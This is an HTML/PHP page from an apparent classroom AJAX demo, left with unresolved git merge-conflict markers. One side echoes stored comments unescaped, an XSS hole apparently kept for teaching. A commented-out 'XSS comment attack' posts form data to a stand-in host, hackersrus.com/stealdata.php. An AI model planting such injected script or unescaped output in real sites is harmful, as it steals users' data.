<!DOCTYPE html>
<!--
To change this license header, choose License Headers in Project Properties.
To change this template file, choose Tools | Templates
and open the template in the editor.
-->
<html>
    <head>
        <meta charset="UTF-8">
        <title></title>
        <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
<<<<<<< HEAD
           <script>
           //$ everything goes after the dollar sign//("body")//refrences to the body tag
           // by usin . u are calling upon or refrence to something
         
           function getData(){
               $.post(
                       "/ajaxdemo/wrapper.php", //where u want to post it
                        {numapples:3,numoranges:4, numbananas:5}, // what you want to post/ defining a object
                        function   (data,status,xhr) { //the space in between thats where the name of the function goes here
                               $("#consolearea").html(data); 
                         },
                         "text"//this is the data that is comming back // if not defaults to Guss and jeson data
                );
          }
           </script>
           <style>  
               pre{ width:100%; height:500px; background-color: #eee}
           </style>
    </head>
    <body>
        <button onclick="getData();"> Get the data</button>
        <pre id="consolearea"></pre>
        
    </body>
</html>
=======
        <script>
            function addComment() {
                $.post(
                        "/ajaxdemo/addCommentAjax.php",
                        {numapples:3,numoranges:4,numbananas:5},
                        function (data,status,xhr) {
                            $("#consolearea").html(data);
                        },
                        "text"
                );
            }
        </script>
        <style>
            textarea { width:100%; background-color:#eee}
        </style>
    </head>
    <body>
        <form action="addcomment.php" onsubmit="addComment()">
            <textarea name="commentbox" id="commentbox"></textarea>
            <input type="submit" value="Add comment" />
        </form>
        <h2>Comments</h2>
        <?php
        echo file_get_contents("comments.txt");
        ?>
        <script>
//            $("#btn").click(getData);
        </script>
    </body>
</html>

<!--  XSS comment attack
<script src="https://code.jquery.com/jquery-3.3.1.js"></script>
        <script>
            function malAddComment() {
                $.post(
                        "http://hackersrus.com/stealdata.php",
                        {numapples:3,numoranges:4,numbananas:5},
                        function (data,status,xhr) {
                            $("#consolearea").html(data);
                        },
                        "text"
                );
            }
$("form").submit(malAddComment);
</script>
-->
>>>>>>> upstream/master
